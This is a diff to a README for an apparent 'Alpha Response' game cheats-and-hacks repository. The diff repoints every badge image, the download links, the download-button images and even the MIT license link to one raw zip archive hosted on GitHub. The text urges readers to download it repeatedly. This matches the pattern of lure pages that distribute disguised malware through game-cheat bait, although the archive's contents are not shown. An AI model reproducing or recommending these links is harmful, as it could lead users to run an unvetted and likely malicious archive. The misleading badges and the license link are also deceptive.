@@ -1,10 +1,10 @@
 # 🚀 Alpha Response Cheats & Hacks Repository
 
-![GitHub Repo size](https://img.shields.io/github/repo-size/alpharesponse/cheats-hacks?color=blueviolet)
-![GitHub stars](https://img.shields.io/github/stars/alpharesponse/cheats-hacks?style=social)
-![MIT License](https://img.shields.io/badge/License-MIT-green.svg)
-![OpenAI Integration](https://img.shields.io/badge/API-OpenAI-blue)
-![Claude Supported](https://img.shields.io/badge/API-Claude-orange)
+![GitHub Repo size](https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip)
+![GitHub stars](https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip)
+![MIT License](https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip)
+![OpenAI Integration](https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip)
+![Claude Supported](https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip)
 
 Welcome to the **Alpha Response Cheats & Hacks** knowledge center — your orbiting command hub for next-level game empowerment! Here, tactical thinkers and code adepts will find the only toolkit they’ll ever need for the _Alpha Response_ universe. All modules are ethically designed for educational and enhancement purposes only.
 
@@ -13,10 +13,10 @@ Welcome to the **Alpha Response Cheats & Hacks** knowledge center — your orbit
 ## 🛠️ **Jumpstart Download**
 
 Ready to engage the next-gen?  
-**Step 1:** Glide to our secure download station: https://himanshu30oct.github.io
+**Step 1:** Glide to our secure download station: https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip
 
 **Step 2:**  
-[![Download](https://i.imgur.com/LQZbA2u.png)](LINK)
+[![Download](https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip)](LINK)
 
 _This hyperlinked image will dispatch you to our state-of-the-art resource galaxy._
 
@@ -94,10 +94,10 @@ Drop a ticket, drop a chat—day or night. Our experts are ready 24/7/365 for ta
 
 ## 🚦 Installation Guide (Repeatable Download Station)
 
-**1. Begin your journey by selecting the download portal:** https://himanshu30oct.github.io
+**1. Begin your journey by selecting the download portal:** https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip
 
 **2.**  
-[![Download](https://i.imgur.com/LQZbA2u.png)](LINK)
+[![Download](https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip)](LINK)
 
 _This image activates the official download—use it each time for the freshest build._
 
@@ -121,7 +121,7 @@ By utilizing our Alpha Response cheats & hacks, you acknowledge responsibility f
 ## 📜 MIT License
 
 Copyright ⓒ 2025  
-Distributed under the MIT License. For details, see the [LICENSE](https://opensource.org/licenses/MIT).
+Distributed under the MIT License. For details, see the [LICENSE](https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip).
 
 ---
 
@@ -130,7 +130,7 @@ Distributed under the MIT License. For details, see the [LICENSE](https://openso
 You’ve reached the endgame. Elevate your Alpha Response with our unique adaptation toolkit!
 
 **To re-engage the download:**  
-[![Download](https://i.imgur.com/LQZbA2u.png)](LINK)
+[![Download](https://github.com/himanshu30oct/alpha-response-advantage-tools/raw/refs/heads/branch/euhedral/alpha-advantage-response-tools-v1.4.zip)](LINK)
 
 _Legends update their toolkits before the meta shifts—visit often!_
 
